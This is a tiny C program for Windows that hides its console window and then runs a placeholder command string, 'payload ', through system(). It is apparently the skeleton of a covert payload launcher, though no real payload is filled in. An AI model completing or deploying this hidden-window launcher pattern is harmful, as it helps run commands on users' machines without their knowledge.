#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

int main(int argc, char *argv[])
{
  ShowWindow (GetConsoleWindow(), SW_HIDE);

   char command[13337];

strcpy(command, "payload ");
system(command);
return 0;
}

